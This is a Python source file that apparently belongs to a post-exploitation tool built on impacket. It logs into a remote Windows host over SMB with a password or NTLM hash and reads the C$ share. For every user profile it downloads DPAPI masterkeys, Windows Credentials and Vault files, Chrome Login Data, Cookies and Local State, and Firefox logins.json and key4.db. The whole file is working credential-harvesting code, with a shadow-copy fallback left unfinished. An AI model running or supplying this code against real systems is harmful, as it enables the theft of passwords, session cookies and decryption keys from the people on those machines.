import logging
import impacket.nt_errors
from impacket.smbconnection import SMBConnection, SessionError
import pathlib
import os

class RemoteSystemSearching:
    def __init__(self,options,targt):
        self.impParam = options
        self.__domain = options.domain
        self.__username = options.username
        self.__password = options.password
        self.__nt = options.nt
        self.__lm = options.lm
        self.__enableKerberos = False
        self.target = targt
        self.output = options.output
        self.__defaultDrive = "C$"
        self.__smbConnection = None
        self.shadowcopy = []
        self.smbLogin()

    def smbLogin(self):
        self.__smbConnection = SMBConnection(self.target, self.target, timeout=30)
        try:
            print("[+] SMB Initial state to " + self.target + " ok")
        except Exception as e:
            print(e)
            return -1
        if self.__enableKerberos:
            self.__smbConnection.kerberosLogin(user=self.__username,password=self.__password,nthash=self.__nt,
                                           lmhash=self.__lm,domain=self.__domain)
            print("[+] SMB Login with Kerberos ok")
        else:
            try:
                self.__smbConnection.login(user=self.__username,password=self.__password,domain=self.__domain)
                print("[+] SMB Login with password/NT:LM hash ok")

            except Exception as e:
                logging.error("ERR smbLogin : ",e)
                return -1
        if self.impParam.shadow == True:
            self.shadowcopy = self.listShadowCopy()

    def smbAccessDefaultSystemShare(self):
        try:
            shareList = self.__smbConnection.listShares()
            for share in shareList:
                if(share['shi1_netname'][:-1] in self.__defaultDrive):
                    print("[+] Default system drive " + self.__defaultDrive + " do exist")
        except Exception as e:
            logging.error("ERR smbAccessDefaultSystemShare : ", e)
            return -1

    def listShadowCopy(self):
        try:
            sahdowCopies = self.__smbConnection.listSnapshots(1,"/")
            return sahdowCopies
        except Exception as e:
            print(e)
        return

    def getAllUsersOnSystem(self):
        userList = []
        try:
            self.__smbConnection.connectTree(self.__defaultDrive)
            print("[+] Allowed to read " + self.__defaultDrive +"!")
        except Exception as e:
            logging.error("ERR getAllUsersOnSystem : ", e)
            return -1
        try:
            userDir = self.__smbConnection.listPath(self.__defaultDrive,"Users\\*",password=None)
            for user in userDir[2:]:
                if(user.is_directory()):
                    userList.append(user.get_longname())
        except Exception as e:
            logging.error("ERR getAllUsersOnSystem : ", e)
            return -1
        return userList

    def retrieveUserCredentialsPath(self,user):
        credentialsPath = []
        credentialPath = "\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Credentials"
        try:
            credentialDir = self.__smbConnection.listPath(self.__defaultDrive,credentialPath +"\\*")
            for creds in credentialDir[2:]:
                credentialsPath.append(credentialPath + "\\" + creds.get_longname())

        except Exception as e:
            logging.error("ERR retrieveUserCredentialsPath : ", e)
        return credentialsPath

    def retrieveUserVaultPath(self,user):
        vaultPaths = []
        vaultPath = "\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Vault"
        try:
            vaultDir = self.__smbConnection.listPath(self.__defaultDrive,vaultPath +"\\*")
            for vaultSubDir in vaultDir[2:]:
                try :
                    tempVault = self.__smbConnection.listPath(self.__defaultDrive,vaultPath + "\\" + vaultSubDir.get_longname() + "\\*")
                    isvcrdpresent =""
                    for temp in tempVault[2:]:
                        isvcrdpresent += temp.get_longname()
                    if "vcrd" in isvcrdpresent:
                        for vault in tempVault[2:]:
                            vaultPaths.append(vaultPath + "\\" + vaultSubDir.get_longname() + "\\" + vault.get_longname())
                except Exception as e:
                    logging.error("ERR retrieveUserVaultPath SUBDIR : ", e)
        except Exception as e:
            logging.error("ERR retrieveUserVaultPath DIR : ", e)
        return vaultPaths

    def retrieveUserFirefoxPath(self,user):
        firefoxPaths = []
        firefoxPath ="\\Users\\" + user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        try:
            firefoxDir = self.__smbConnection.listPath(self.__defaultDrive, firefoxPath + "\\*")
            for profile in firefoxDir[2:]:
                firefoxPaths.append(firefoxPath + "\\" + profile.get_longname())
        except SessionError as sesserr:
            pass
        except Exception as e:
            logging.error("ERR retrieveUserFirefoxPath : ", e)
        return firefoxPaths

    def retrieveUserChromePath(self, user):
        chromePath = "\\Users\\" + user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
        try:
            self.__smbConnection.listPath(self.__defaultDrive, chromePath + "\\*")
            return chromePath
        except Exception as e:
            logging.error("ERR retrieveUserChromePath : ", e)
        return

    def retrieveUserMasterkeyPath(self,user):
        allMasterkey =[]
        masterkeyPath = "\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Protect\\"
        try:
            masterkeySubPath = self.__smbConnection.listPath(self.__defaultDrive,masterkeyPath +"\\*" )
            for subPath in masterkeySubPath[2:]:
                try:
                    tempMasterkey = self.__smbConnection.listPath(self.__defaultDrive,"\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Protect\\"+ subPath.get_longname() +"\\*")
                    for masterkey in tempMasterkey[2:]:
                        allMasterkey.append("\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Protect\\"+ subPath.get_longname() +"\\" +masterkey.get_longname())
                except SessionError as sesserr:
                    pass
                except Exception as e:
                    logging.error("ERR retrieveUserMasterkeyPath SUBDIR : ", e)
        except SessionError as sesserr:
            pass
        except Exception as e:
            logging.error("ERR retrieveUserMasterkeyPath DIR : ", e)
        return allMasterkey

    def __dumpVaultFiles(self,windowsuser):
        if(windowsuser.vaultRemotePaths == None):
            return windowsuser
        user = windowsuser.username
        for path in windowsuser.vaultRemotePaths:
            GUID = path.split("\\")[-2]
            vault_name = path.split("\\")[-1]
            os.makedirs(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Vault/" + GUID), exist_ok=True)
            try:
                outFile = open(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Vault/" + GUID + "/" + vault_name),"wb+")
                self.__smbConnection.getFile(self.__defaultDrive,path,outFile.write)
                windowsuser.vaultLocalPaths.append(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Vault/" + GUID + "/" + vault_name))
                print("[+] Dumped Vault : \\\\" + self.target + "\\" + path)
            except SessionError as sesserr:
                pass
            except Exception as e:
                logging.error("ERR __dumpVaultFiles : ", e)
        return windowsuser

    def __dumpChromeFiles(self,windowsuser):
        onlyOne = False
        OnlyOneShadow = False
        if(windowsuser.chromeRemotePaths == None):
            return windowsuser
        dumpFileList= ["History","Visited Websites","Login Data","Favorites","Top sites","Cookies","Local State"]
        os.makedirs(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Chrome/"), exist_ok=True)
        for file in dumpFileList:
            try:
                outFile = open(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Chrome/" + file),"wb+")
                if file =="Local State":
                    self.__smbConnection.getFile(self.__defaultDrive, windowsuser.chromeRemotePaths + "\\..\\" + file, outFile.write)
                    windowsuser.chromeLocalPathLocalState = pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Chrome/" + file)
                else:
                    self.__smbConnection.getFile(self.__defaultDrive, windowsuser.chromeRemotePaths + "\\" + file,outFile.write)
                    windowsuser.chromeLocalPaths.append(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Chrome/" + file))
                print("[+] Dumped Chrome : \\\\" + self.target + "\\" + self.__defaultDrive + windowsuser.chromeRemotePaths + "\\" + file)

                outFile.close()
            except SessionError as sesserr:
                if sesserr.getErrorCode() == impacket.nt_errors.STATUS_SHARING_VIOLATION :
                    if not onlyOne:
                        print("[-] Chrome seems to be open, can't retrieve History,Login Data and Cookies")
                        onlyOne = True
                    if self.impParam.shadow == True:
                        if not OnlyOneShadow :
                            print("[-] Trying to retrieve Chrome files through some existing shadow copies")
                        if self.shadowcopy:
                            OnlyOneShadow = True
                            print("[+] Found some shadow copies !")
                            for shadow in self.shadowcopy:
                                outFile = open(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Chrome/" + file),"wb+")
                                try:
                                    pass
                                    # TODO
                                except Exception as e:
                                    print("Err shadow copy",e)
                        else:
                            if not OnlyOneShadow:
                                print("[-] Failed to found some existing shadow copies")
                                OnlyOneShadow = True
            except Exception as e:
                logging.error("ERR __dumpChromeFiles : ", e)
        return windowsuser

    def __dumpFirefoxFiles(self,windowsuser):
        if not windowsuser.firefoxRemotePaths:
            return windowsuser
        dumpFileList=["logins.json","places.sqlite","key4.db","content-prefs.sqlite","cert9.db","cert8.db"]
        os.makedirs(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Firefox/"), exist_ok=True)
        for file in dumpFileList:
            for firefoxPath in windowsuser.firefoxRemotePaths:
                try:
                    outFile = open(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Firefox/" + file), "wb+")
                    # TODO : Check file size before writing it : i.e check if == 0
                    self.__smbConnection.getFile(self.__defaultDrive,firefoxPath + "\\" + file, outFile.write)
                    print("[+] Dumped Firefox: \\\\" + self.target + "\\" + self.__defaultDrive + firefoxPath + "\\" + file)
                    windowsuser.firefoxLocalPaths.append(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + windowsuser.username + "/Firefox/"+ file))
                    outFile.close()
                except SessionError as sesserr:
                    pass
                except Exception as e:
                    logging.error("ERR __dumpFirefoxFiles : ", e)
        return windowsuser

    def __dumpCredentialsFiles(self,windowsuser):
        user = windowsuser.username
        for path in windowsuser.credentialsRemotePaths:
            credentials_filename = path.split("\\")[-1]
            os.makedirs(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Credentials/" ),exist_ok=True)
            try:
                outFile = open(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Credentials/" + credentials_filename),"wb+")
                self.__smbConnection.getFile(self.__defaultDrive,path,outFile.write)
                windowsuser.credentialsLocalPaths.append(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Credentials/" + credentials_filename))
                print("[+] Dumped credentials file : \\\\" + self.target + "\\" + path)
                outFile.close()
            except SessionError as sesserr:
                pass
            except Exception as e:
                logging.error("ERR __dumpCredentialsFiles : ", e)
        return windowsuser

    def __dumpMasterkeyFiles(self,windowsuser):
        user = windowsuser.username
        for path in windowsuser.masterkeyRemotePaths:
            SID = path.split("\\")[-2]
            masterkeyName = path.split("\\")[-1]
            os.makedirs(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Masterkey/" + SID + "/"), exist_ok=True)
            try:
                outFile = open(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Masterkey/" + SID + "/" + masterkeyName), "wb+")
                self.__smbConnection.getFile(self.__defaultDrive,path, outFile.write)
                windowsuser.masterkeyLocalPaths.append(pathlib.Path(os.getcwd() + "/" + self.output + "/" + self.target + "/" + user + "/Masterkey/" + SID + "/" + masterkeyName))
                print("[+] Dumped Masterkey: \\\\" + self.target + "\\" + path)
            except SessionError as sesserr:
                pass
            except Exception as e:
                logging.error("ERR __dumpMasterkeyFiles : ", e)
        return windowsuser

    def dumpVautlFilesAllUsers(self,allWindowsUsers):
        newAllWindowsUser = []
        for windowsUsers in allWindowsUsers:
            newAllWindowsUser.append(self.__dumpVaultFiles(windowsUsers))
        return newAllWindowsUser

    def dumpCredentialsFilesAllUsers(self,allWindowsUsers):
        newAllWindowsUser = []
        for windowsUsers in allWindowsUsers:
            newAllWindowsUser.append(self.__dumpCredentialsFiles(windowsUsers))
        return newAllWindowsUser

    def dumpMasterkeyFilesAllUsers(self,allWindowsUsers):
        newAllWindowsUser = []
        for windowsUsers in allWindowsUsers:
            newAllWindowsUser.append(self.__dumpMasterkeyFiles(windowsUsers))
        return newAllWindowsUser

    def dumpFirefoxFilesAllUsers(self,allWindowsUsers):
        newAllWindowsUsers = []
        for windowsUsers in allWindowsUsers:
            newAllWindowsUsers.append(self.__dumpFirefoxFiles(windowsUsers))
        return newAllWindowsUsers

    def dumpChromeFilesAllUsers(self,allWindowsUsers):
        newAllWindowsUsers = []
        for windowsUsers in allWindowsUsers:
            newAllWindowsUsers.append(self.__dumpChromeFiles(windowsUsers))
        return newAllWindowsUsers

